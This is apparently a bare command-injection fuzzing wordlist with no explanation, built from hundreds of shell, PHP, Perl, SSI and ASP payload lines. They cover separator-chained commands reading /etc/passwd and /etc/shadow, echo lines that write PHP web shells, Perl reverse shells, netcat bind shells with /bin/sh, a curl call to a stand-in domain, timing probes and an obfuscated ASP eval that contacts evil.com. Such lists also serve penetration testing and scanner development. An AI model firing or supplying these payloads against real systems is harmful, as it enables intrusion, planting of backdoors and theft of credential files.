$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
$(`cat /etc/passwd`)
$(`dir`)
$(echo SYCGSY > SYCGSY.txt)
'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
'echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
& echo "<?php include($_GET['page']); ?>" > rfi.php
&& echo "<?php include($_GET['page']); ?>" > rfi.php
; echo "<?php include($_GET['page']); ?>" > rfi.php
| echo "<?php include($_GET['page'])| ?>" > rfi.php
echo "<?php include($_GET['page']); ?>" > rfi.php
& echo "<?php system($_GET['cmd']); ?>" > cmd.php
&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
; echo "<?php system($_GET['cmd']); ?>" > cmd.php
| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
echo "<?php system($_GET['cmd']); ?>" > cmd.php
& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
"&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
";echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
';echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
;echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
";echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
';echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
;echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
";echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
';echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
;echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
";echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
';echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
;echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
";echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
';echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
;echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
"&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
";echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
"||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
"|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
"echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
';echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
;echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i 2,2)&"""")""""):i=i 2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")
eval('ls')
eval('pwd')
eval('pwd');
eval('sleep 5')
eval('sleep 5');
eval('whoami')
eval('whoami');
<!--#exec cmd="/bin/cat /etc/passwd"-->
<!--#exec cmd="/bin/cat /etc/shadow"-->
<!--#exec cmd="/usr/bin/id;-->
exec('ls')
exec('pwd')
exec('pwd');
exec('sleep 5')
exec('sleep 5');
exec('whoami')
exec('whoami');
{{ get_user_file("C:\boot.ini") }}
{{ get_user_file("/etc/hosts") }}
{{ get_user_file("/etc/passwd") }}
& id
&&id
; id
;id
;id;
;id|
`id`
| id
|id
|id;
|id|
;id\n
& ifconfig
&& ifconfig
; ifconfig
| ifconfig
ifconfig
ipconfig
& ipconfig /all
&& ipconfig /all
; ipconfig /all
| ipconfig /all
ipconfig /all
& ls -l /
&& ls -l /
; ls -l /
| ls -l /
ls -l /
& ls -laR /etc
&& ls -laR /etc
; ls -laR /etc
| ls -laR /etc
& ls -laR /var/www
&& ls -laR /var/www
; ls -laR /var/www
| ls -laR /var/www
& ls -l /etc/
&& ls -l /etc/
; ls -l /etc/
| ls -l /etc/
ls -l /etc/
ls -lh /etc/
& ls -l /home/*
&& ls -l /home/*
; ls -l /home/*
| ls -l /home/*
ls -l /home/*
*; ls -lhtR /var/www/
& ls -l /tmp
&& ls -l /tmp
; ls -l /tmp
| ls -l /tmp
ls -l /tmp
& ls -l /var/www/*
&& ls -l /var/www/*
; ls -l /var/www/*
| ls -l /var/www/*
ls -l /var/www/*
\n/bin/ls -al\n
& nc -lvvp 4444 -e /bin/sh&
&& nc -lvvp 4444 -e /bin/sh &
; nc -lvvp 4444 -e /bin/sh;
| nc -lvvp 4444 -e /bin/sh|
nc -lvvp 4444 -e /bin/sh
nc -lvvp 4445 -e /bin/sh &
nc -lvvp 4446 -e /bin/sh|
nc -lvvp 4447 -e /bin/sh;
nc -lvvp 4448 -e /bin/sh&
;netstat -a;
& netstat -an
&& netstat -an
; netstat -an
| netstat -an
netstat -an
& net view
&& net view
; net view
| net view
\nid;
\nid|
\nid\n
|nid\n
\n/usr/bin/id;
\n/usr/bin/id|
\n/usr/bin/id\n
& phpinfo()
&& phpinfo()
';phpinfo();//
;phpinfo()
;phpinfo();//
| phpinfo()
|| phpinfo()
phpinfo();
<?php system("cat /etc/passwd");?>
<?php system("curl https://fake.domain/rce_vuln.txt?req=df2fkjj");?>
<?php system("sleep 10");?>
:phpversion();
||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
& ping -i 30 127.0.0.1 &
".print(`echo ACGJLG%0aecho $((54+11))%0aecho ACGJLG%0aecho ACGJLG`);%255C%255CACGJLG
")print(`echo ADFEOJ%0aecho $((67+57))%0aecho ADFEOJ%0aecho ADFEOJ`);.%2527ADFEOJ
'print(`echo ADRNCB;echo $((35+33));echo ADRNCB;echo ADRNCB`);.'ADRNCB
print(`echo ADZJNM`.`echo $((71+71))`.`echo ADZJNM`.`echo ADZJNM`);\\ADZJNM
)print(`echo AFOMNK%0aecho $((45+23))%0aecho AFOMNK%0aecho AFOMNK`);%2529%257DAFOMNK
')print(`echo AGBHMS%0aecho $((79+32))%0aecho AGBHMS%0aecho AGBHMS`);%2529%257DAGBHMS
".print(`echo AGODDO%0aecho $((7+33))%0aecho AGODDO%0aecho AGODDO`);AGODDO
'print(`echo AHOHOK%0aecho $((14+28))%0aecho AHOHOK%0aecho AHOHOK`);AHOHOK
'print(`echo ANYJLP`.`echo $((86+96))`.`echo ANYJLP`.`echo ANYJLP`);.'ANYJLP
)print(`echo ASMFMR\necho $((34+56))\necho ASMFMR\necho ASMFMR`);%252523ASMFMR
")print(`echo ATRPAE;echo $((77+72));echo ATRPAE;echo ATRPAE`);\\ATRPAE
'print(`echo AWHBQS\necho $((81+11))\necho AWHBQS\necho AWHBQS`);%252529%25257DAWHBQS
'print(`echo AYKYLG%0aecho $((60+1))%0aecho AYKYLG%0aecho AYKYLG`);.%2527AYKYLG
);}print(`echo BAPQUZ;echo $((9+46));echo BAPQUZ;echo BAPQUZ`);//BAPQUZ
print(`echo BAYPKT`.`echo $((43+10))`.`echo BAYPKT`.`echo BAYPKT`);BAYPKT
);}print(`echo BCMROJ;echo $((2+69));echo BCMROJ;echo BCMROJ`);.'BCMROJ
'print(`echo BFUQZN%0aecho $((42+76))%0aecho BFUQZN%0aecho BFUQZN`);%2529%257DBFUQZN
');}print(`echo BHUVJI\necho $((10+13))\necho BHUVJI\necho BHUVJI`);BHUVJI
);}print(`echo BJFECX;echo $((21+86));echo BJFECX;echo BJFECX`);#BJFECX
')print(`echo BONGAS;echo $((69+7));echo BONGAS;echo BONGAS`);\\BONGAS
');}print(`echo BQJSKG;echo $((72+76));echo BQJSKG;echo BQJSKG`);#BQJSKG
print(`echo BQVIXY\necho $((53+95))\necho BQVIXY\necho BQVIXY`);%252529%25257DBQVIXY
'print(`echo BRTYSY\necho $((74+40))\necho BRTYSY\necho BRTYSY`);BRTYSY
")print(`echo BUJJSS\necho $((4+1))\necho BUJJSS\necho BUJJSS`);%252529%25257DBUJJSS
')print(`echo BWPFXW%0aecho $((76+34))%0aecho BWPFXW%0aecho BWPFXW`);BWPFXW
")print(`echo CAQHUJ;echo $((70+24));echo CAQHUJ;echo CAQHUJ`);.'CAQHUJ
".print(`echo CEZYFB\necho $((70+98))\necho CEZYFB\necho CEZYFB`);.%252522CEZYFB
")print(`echo CHKGSS`.`echo $((80+0))`.`echo CHKGSS`.`echo CHKGSS`);#CHKGSS
");}print(`echo CKSIUK\necho $((45+4))\necho CKSIUK\necho CKSIUK`);%252523CKSIUK
print(`echo COMCFL\necho $((84+79))\necho COMCFL\necho COMCFL`);COMCFL
")print(`echo COMPTT`.`echo $((78+29))`.`echo COMPTT`.`echo COMPTT`);COMPTT
")print(`echo COYGWQ;echo $((40+21));echo COYGWQ;echo COYGWQ`);)}COYGWQ
".print(`echo COYIQB`.`echo $((70+26))`.`echo COYIQB`.`echo COYIQB`);COYIQB
'print(`echo CRERAD;echo $((48+33));echo CRERAD;echo CRERAD`);//CRERAD
'print(`echo CVFEYY\necho $((56+86))\necho CVFEYY\necho CVFEYY`);//CVFEYY
'.print(`echo CXYKAU\necho $((56+15))\necho CXYKAU\necho CXYKAU`);//CXYKAU
print(`echo DAESAZ\necho $((6+17))\necho DAESAZ\necho DAESAZ`);%25255C%25255CDAESAZ
print(`echo DBCNNO%0aecho $((39+97))%0aecho DBCNNO%0aecho DBCNNO`);.%2522DBCNNO
".print(`echo DBTAFQ\necho $((79+27))\necho DBTAFQ\necho DBTAFQ`);.%252527DBTAFQ
print(`echo DEGOPG;echo $((38+61));echo DEGOPG;echo DEGOPG`);\\DEGOPG
);}print(`echo DETLEF`.`echo $((0+62))`.`echo DETLEF`.`echo DETLEF`);."DETLEF
');}print(`echo DEXNOX\necho $((69+36))\necho DEXNOX\necho DEXNOX`);%252529%25257DDEXNOX
".print(`echo DFRGXJ`.`echo $((12+99))`.`echo DFRGXJ`.`echo DFRGXJ`);."DFRGXJ
");}print(`echo DKLYZK;echo $((5+95));echo DKLYZK;echo DKLYZK`);#DKLYZK
)print(`echo DLBCJS;echo $((58+85));echo DLBCJS;echo DLBCJS`);\\DLBCJS
)print(`echo DPBGWU%0aecho $((48+67))%0aecho DPBGWU%0aecho DPBGWU`);.%2522DPBGWU
'print(`echo DQLEND`.`echo $((63+84))`.`echo DQLEND`.`echo DQLEND`);\\DQLEND
);}print(`echo DSHIRJ\necho $((54+41))\necho DSHIRJ\necho DSHIRJ`);.%252522DSHIRJ
".print(`echo DSHOEV%0aecho $((44+47))%0aecho DSHOEV%0aecho DSHOEV`);%2523DSHOEV
'print(`echo DUAYMM`.`echo $((77+73))`.`echo DUAYMM`.`echo DUAYMM`);DUAYMM
')print(`echo DWTUTD%0aecho $((10+15))%0aecho DWTUTD%0aecho DWTUTD`);//DWTUTD
'.print(`echo DWVXEQ;echo $((13+19));echo DWVXEQ;echo DWVXEQ`);#DWVXEQ
print(`echo DWYWNU;echo $((31+36));echo DWYWNU;echo DWYWNU`);DWYWNU
print(`echo DYZZIW;echo $((94+81));echo DYZZIW;echo DYZZIW`);#DYZZIW
)print(`echo ECXTUU;echo $((10+67));echo ECXTUU;echo ECXTUU`);#ECXTUU
)print(`echo EHMRQP`.`echo $((92+22))`.`echo EHMRQP`.`echo EHMRQP`);#EHMRQP
')print(`echo EHPKWP\necho $((79+86))\necho EHPKWP\necho EHPKWP`);//EHPKWP
')print(`echo EHVUCK;echo $((3+47));echo EHVUCK;echo EHVUCK`);.'EHVUCK
print(`echo EIPAAC\necho $((42+82))\necho EIPAAC\necho EIPAAC`);%252523EIPAAC
".print(`echo EKDSZM;echo $((50+62));echo EKDSZM;echo EKDSZM`);."EKDSZM
');}print(`echo EKPEWV%0aecho $((50+69))%0aecho EKPEWV%0aecho EKPEWV`);EKPEWV
')print(`echo ESWACN;echo $((37+82));echo ESWACN;echo ESWACN`);ESWACN
print(`echo ETZHWZ\necho $((20+88))\necho ETZHWZ\necho ETZHWZ`);//ETZHWZ
');}print(`echo EVHTLK\necho $((99+40))\necho EVHTLK\necho EVHTLK`);//EVHTLK
)print(`echo EVRVDK\necho $((98+18))\necho EVRVDK\necho EVRVDK`);%252529%25257DEVRVDK
')print(`echo EVXXCT;echo $((87+15));echo EVXXCT;echo EVXXCT`);."EVXXCT
'.print(`echo EVZCEK%0aecho $((38+37))%0aecho EVZCEK%0aecho EVZCEK`);%255C%255CEVZCEK
')print(`echo EXVUXJ\necho $((73+54))\necho EXVUXJ\necho EXVUXJ`);EXVUXJ
".print(`echo EYOYIJ;echo $((34+58));echo EYOYIJ;echo EYOYIJ`);//EYOYIJ
)print(`echo EZVLWV\necho $((40+27))\necho EZVLWV\necho EZVLWV`);.%252527EZVLWV
')print(`echo FCMKMZ;echo $((68+75));echo FCMKMZ;echo FCMKMZ`);//FCMKMZ
)print(`echo FGPZFR%0aecho $((7+1))%0aecho FGPZFR%0aecho FGPZFR`);.%2527FGPZFR
');}print(`echo FOGQPM\necho $((27+12))\necho FOGQPM\necho FOGQPM`);%25255C%25255CFOGQPM
'print(`echo FQEMGW%0aecho $((58+2))%0aecho FQEMGW%0aecho FQEMGW`);.%2522FQEMGW
'.print(`echo GDFQZF;echo $((65+2));echo GDFQZF;echo GDFQZF`);//GDFQZF
print(`echo GDOHGQ\necho $((28+89))\necho GDOHGQ\necho GDOHGQ`);.%252522GDOHGQ
print(`echo GENLGI`.`echo $((14+11))`.`echo GENLGI`.`echo GENLGI`);#GENLGI
)print(`echo GGCMZV`.`echo $((6+53))`.`echo GGCMZV`.`echo GGCMZV`))}GGCMZV
'print(`echo GGTKKU`.`echo $((23+93))`.`echo GGTKKU`.`echo GGTKKU`);//GGTKKU
")print(`echo GHHJFR%0aecho $((52+63))%0aecho GHHJFR%0aecho GHHJFR`);%255C%255CGHHJFR
");}print(`echo GHISCR\necho $((96+53))\necho GHISCR\necho GHISCR`);.%252522GHISCR
")print(`echo GIKPYM\necho $((77+22))\necho GIKPYM\necho GIKPYM`);.%252527GIKPYM
');}print(`echo GKLRKU%0aecho $((97+77))%0aecho GKLRKU%0aecho GKLRKU`);.%2522GKLRKU
'print(`echo GSORDT;echo $((68+29));echo GSORDT;echo GSORDT`);#GSORDT
');}print(`echo GVZZMK;echo $((1+62));echo GVZZMK;echo GVZZMK`);//GVZZMK
".print(`echo HAMONB`.`echo $((26+57))`.`echo HAMONB`.`echo HAMONB`);.'HAMONB
'.print(`echo HBLPLA%0aecho $((39+88))%0aecho HBLPLA%0aecho HBLPLA`);.%2522HBLPLA
');}print(`echo HDQYRP`.`echo $((43+86))`.`echo HDQYRP`.`echo HDQYRP`);."HDQYRP
');}print(`echo HDWSHN%0aecho $((40+78))%0aecho HDWSHN%0aecho HDWSHN`);%255C%255CHDWSHN
');}print(`echo HEGGJN`.`echo $((68+69))`.`echo HEGGJN`.`echo HEGGJN`);.'HEGGJN
".print(`echo HGIQEK;echo $((64+67));echo HGIQEK;echo HGIQEK`);)}HGIQEK
print(`echo HHRISK\necho $((73+42))\necho HHRISK\necho HHRISK`);.%252527HHRISK
'.print(`echo HLTCMZ`.`echo $((55+5))`.`echo HLTCMZ`.`echo HLTCMZ`))}HLTCMZ
)print(`echo HQNHAD%0aecho $((91+64))%0aecho HQNHAD%0aecho HQNHAD`);HQNHAD
");}print(`echo HWAGVJ%0aecho $((14+22))%0aecho HWAGVJ%0aecho HWAGVJ`);%255C%255CHWAGVJ
")print(`echo HXHMHH;echo $((40+31));echo HXHMHH;echo HXHMHH`);//HXHMHH
);}print(`echo HXJYZZ%0aecho $((70+79))%0aecho HXJYZZ%0aecho HXJYZZ`);.%2522HXJYZZ
)print(`echo HXXRRP`.`echo $((98+1))`.`echo HXXRRP`.`echo HXXRRP`);."HXXRRP
");}print(`echo IBFQKH;echo $((32+31));echo IBFQKH;echo IBFQKH`);."IBFQKH
)print(`echo IFOQRT;echo $((35+23));echo IFOQRT;echo IFOQRT`);//IFOQRT
".print(`echo IFQMUW\necho $((62+32))\necho IFQMUW\necho IFQMUW`);IFQMUW
');}print(`echo IFVTUZ\necho $((51+31))\necho IFVTUZ\necho IFVTUZ`);.%252527IFVTUZ
'.print(`echo IINFPE\necho $((95+84))\necho IINFPE\necho IINFPE`);.%252527IINFPE
');}print(`echo IMZVGR%0aecho $((80+38))%0aecho IMZVGR%0aecho IMZVGR`);%2523IMZVGR
'.print(`echo IQVVVA`.`echo $((38+34))`.`echo IQVVVA`.`echo IQVVVA`);IQVVVA
');}print(`echo IXTNVY%0aecho $((8+16))%0aecho IXTNVY%0aecho IXTNVY`);%2529%257DIXTNVY
'.print(`echo IYCMIH\necho $((35+93))\necho IYCMIH\necho IYCMIH`);%252523IYCMIH
');}print(`echo JDHUOY;echo $((0+32));echo JDHUOY;echo JDHUOY`);."JDHUOY
");}print(`echo JFBZLZ%0aecho $((64+83))%0aecho JFBZLZ%0aecho JFBZLZ`);//JFBZLZ
);}print(`echo JIIHYT;echo $((7+65));echo JIIHYT;echo JIIHYT`);)}JIIHYT
'print(`echo JIKWPW\necho $((92+0))\necho JIKWPW\necho JIKWPW`);.%252527JIKWPW
'.print(`echo JLXMKL\necho $((67+26))\necho JLXMKL\necho JLXMKL`);.%252522JLXMKL
")print(`echo JNKGOO\necho $((17+90))\necho JNKGOO\necho JNKGOO`);.%252522JNKGOO
);}print(`echo JRCPDX;echo $((59+49));echo JRCPDX;echo JRCPDX`);\\JRCPDX
